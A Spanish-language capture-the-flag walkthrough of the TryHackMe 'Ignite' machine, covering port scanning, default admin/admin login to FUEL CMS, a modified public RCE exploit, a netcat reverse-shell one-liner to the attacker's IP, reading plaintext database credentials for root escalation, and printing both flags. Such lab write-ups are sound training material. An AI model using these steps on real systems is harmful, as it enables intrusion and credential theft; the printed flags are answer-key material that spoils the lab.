## **Tutorial: Explotación de la máquina Ignite en TryHackMe**


## 1. Conexión a la VPN de TryHackMe

Para poder acceder a las máquinas del laboratorio es necesario conectarse primero a la VPN de TryHackMe. Esto crea un túnel cifrado entre la máquina Kali y la red privada del laboratorio.

### 1.1 Conexión mediante OpenVPN

Desde la terminal de Kali ejecutamos el siguiente comando utilizando el archivo .ovpn descargado desde la plataforma:

```bash
sudo openvpn /home/nerea/Descargas/eu-central-1-nereacandonramos-regular.ovpn
```
Si este no funciona, probar el west-3-
Si la conexión se establece correctamente aparecerá el mensaje:

```bash
Initialization Sequence Completed
```

Esto indica que la VPN se ha establecido correctamente.

### 1.2 Verificación de la conexión

Para comprobar que la conexión está activa ejecutamos:

```bash
ip a
```

Esto mostrará una interfaz de red llamada tun0, que corresponde a la conexión VPN con TryHackMe.

## 2. Escaneo de puertos con Nmap

El siguiente paso consiste en identificar los servicios expuestos en la máquina objetivo utilizando Nmap, una herramienta fundamental para el reconocimiento en auditorías de seguridad.

Se ejecuta el siguiente comando:

Escaneo completo de puertos:

```bash
nmap -sC -sV -p- 10.130.138.36
```

![nmap](Maquina_de_Linux/Ignite/imagenes/nmap.png)

Análisis de resultados

Del escaneo se obtienen varias conclusiones importantes:

- Solo hay un puerto abierto (80), lo que indica que el ataque se centrará en el servicio web.
- El servidor utiliza Apache 2.4.18 sobre Ubuntu.
- El archivo robots.txt revela la ruta /fuel/, lo cual puede indicar un panel administrativo.
- El título de la página confirma el uso de FUEL CMS.


## 3. Enumeración del servicio web

### 3.1 Acceso a la página principal

Se accede al servicio web desde el navegador:

```bash
http://10.130.138.36
```

![nmap](Maquina_de_Linux/Ignite/imagenes/url.png)

Se observa una página por defecto de FUEL CMS, lo que confirma la tecnología utilizada.


### 3.2 Acceso al panel administrativo

Dado que el archivo robots.txt indica la ruta /fuel/, se intenta acceder directamente:

```bash
http://10.130.138.36/fuel/
```

![nmap](Maquina_de_Linux/Ignite/imagenes/url2.png)

Se muestra un panel de autenticación.



### 3.3 Prueba de credenciales por defecto

Se prueban credenciales comunes:

Usuario: admin
Contraseña: admin

![nmap](Maquina_de_Linux/Ignite/imagenes/url3.png)

El acceso es exitoso, lo que indica una mala configuración de seguridad al mantener credenciales por defecto.


## 4. Búsqueda de vulnerabilidades

Una vez identificado el CMS, se procede a buscar vulnerabilidades conocidas.

Se utiliza Searchsploit:

```bash
searchsploit fuel cms
```

![nmap](Maquina_de_Linux/Ignite/imagenes/search.png)

Resultado

Se encuentra un exploit relevante:

```bash
Fuel CMS 1.4.1 - Remote Code Execution
```

Esto indica que el sistema es vulnerable a ejecución remota de comandos.


## 5. Explotación

### 5.1 Obtención del exploit

Se descarga el exploit:

```bash
searchsploit -m php/webapps/47138.py
```

![nmap](Maquina_de_Linux/Ignite/imagenes/search2.png)

### 5.2 Análisis y modificación del exploit

Antes de ejecutar el exploit, es necesario revisarlo y adaptarlo, ya que por defecto contiene configuraciones que pueden provocar errores.

Se abre el archivo:

```bash
nano 47138.py
```

Problema 1: URL incorrecta

El script contiene la siguiente línea:

```bash
url = "http://127.0.0.1:8881"
```

Esta dirección apunta al localhost del atacante, no a la máquina víctima.

Solución

Se modifica por la IP del objetivo:

```bash
url = "http://10.130.138.36"
```

Problema 2: Uso de proxy (Burp Suite)

El script incluye configuración para usar un proxy local (Burp Suite):

```bash
proxy = {"http":"http://127.0.0.1:8080"}
r = requests.get(burp0_url, proxies=proxy)
```

Esto provoca el error:

```bash
ProxyError: Cannot connect to proxy
```

ya que no hay ningún proxy activo en ese puerto.

Solución

Se elimina el uso del proxy modificando la línea:

```bash
r = requests.get(burp0_url)
```

Y opcionalmente se comenta o elimina la línea del proxy:

```bash
# proxy = {"http":"http://127.0.0.1:8080"}
```

![nmap](Maquina_de_Linux/Ignite/imagenes/exploit.png)


### 5.3 Ejecución del exploit

Una vez realizadas las modificaciones, se ejecuta el exploit:

```bash
python2 47138.py -u http://10.130.138.36/
```

![nmap](Maquina_de_Linux/Ignite/imagenes/python.png)

El script solicita comandos de forma interactiva:

```bash
cmd:
```


### 5.4 Ejecución de comandos remotos

Se prueba la ejecución de comandos:

```bash
id
```

![nmap](Maquina_de_Linux/Ignite/imagenes/id.png)

Resultado:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Esto confirma que se ha conseguido ejecución remota de código (RCE) sobre el servidor con el usuario www-data.


### 5.5 Obtención de una reverse shell

Para obtener acceso interactivo al sistema, se lanza una reverse shell.

**Paso 1: Preparar listener**

En la máquina atacante:

```bash
nc -lvnp 4444
```

![nmap](Maquina_de_Linux/Ignite/imagenes/nc.png)

**Paso 2: Enviar la shell desde el exploit**

En el prompt cmd::

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 192.168.142.53 4444 >/tmp/f
```

![nmap](Maquina_de_Linux/Ignite/imagenes/rm.png)

Donde TU_IP corresponde a la dirección IP de la interfaz tun0.

**Paso 3: Recepción de la conexión**

Si la explotación es correcta, se obtiene acceso a la máquina víctima desde la terminal de Kali.


## 6. Estabilización de la shell

Una vez obtenida la reverse shell, esta no es completamente interactiva, por lo que se procede a estabilizarla para mejorar su uso.

Se utiliza el siguiente comando:

```bash
python2 -c 'import pty; pty.spawn("/bin/bash")'
```

Si no funciona:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Posteriormente:

```bash
export TERM=xterm
```

![nmap](Maquina_de_Linux/Ignite/imagenes/ubuntu.png)

Y se puede mejorar la interacción con:

```bash
Ctrl + Z
stty raw -echo; fg
```

Esto permite obtener una shell más estable y funcional.


### 7. Escalada de privilegios

Una vez dentro del sistema como usuario www-data, el siguiente paso es buscar información sensible que permita escalar privilegios.

```bash
whoami
```

### 7.1 Búsqueda de credenciales

Se revisan archivos de configuración del CMS, ya que suelen contener credenciales en texto plano:

```bash
cat /var/www/html/fuel/application/config/database.php
```

### 7.2 Obtención de credenciales

Dentro del archivo se encuentran credenciales de base de datos, incluyendo una contraseña reutilizable en el sistema.


```bash
'username' => 'root',
'password' => 'mememe'
```

![nmap](Maquina_de_Linux/Ignite/imagenes/mysql.png)


### 7.3 Cambio a usuario root

Se utiliza la contraseña encontrada para escalar privilegios:

```bash
su root
```

Se introduce la contraseña:

```bash
mememe
```

![nmap](Maquina_de_Linux/Ignite/imagenes/root.png)

Si la autenticación es correcta, se obtiene acceso como usuario root.


## 7.4 Obtención de la user flag

Antes de escalar a root, se obtiene la flag del usuario dentro del sistema.

Normalmente se encuentra en el directorio del usuario o en /home.

Se busca el archivo de flag:

```bash
ls /home
```

En esta máquina suele existir el usuario:

```bash
www-data
```

Luego vamos a  home y al perfil

```bash
cd /home/www-data
```

Acceso a la flag

Una vez localizada, se lee con:

```bash
cat /home/www-data/flag.txt
```

Resultado

Se obtiene la user flag, confirmando el acceso inicial completo al sistema.

![nmap](Maquina_de_Linux/Ignite/imagenes/user.png)

flag: 6470e394cbf6dab6a91682cc8585059b 


## 8. Obtención de la flag

Una vez con privilegios de root, se accede al directorio del usuario root para obtener la flag final:

```bash
cd /root
ls
cat root.txt
```

![nmap](Maquina_de_Linux/Ignite/imagenes/catroot.png)

flag: b9bbcb33e11b80be759c4e844862482d 
